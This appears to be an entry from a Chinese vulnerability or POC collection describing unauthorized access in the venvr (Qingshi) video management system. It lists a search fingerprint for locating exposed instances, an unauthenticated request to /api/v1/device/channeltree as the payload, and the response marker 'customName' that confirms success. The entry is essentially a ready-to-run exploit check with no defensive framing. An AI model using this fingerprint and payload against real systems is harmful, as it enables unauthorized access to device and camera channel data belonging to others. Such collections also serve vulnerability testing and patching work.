# venvr青柿视频管理系统channeltree未授权访问漏洞

venvr ｜ 未授权访问 ｜ —
- **指纹**：`body="js/liveplayer-lib.min.js"`

**Payload**
```
/api/v1/device/channeltree?serial=&pcode
```
- **响应特征**：200 customName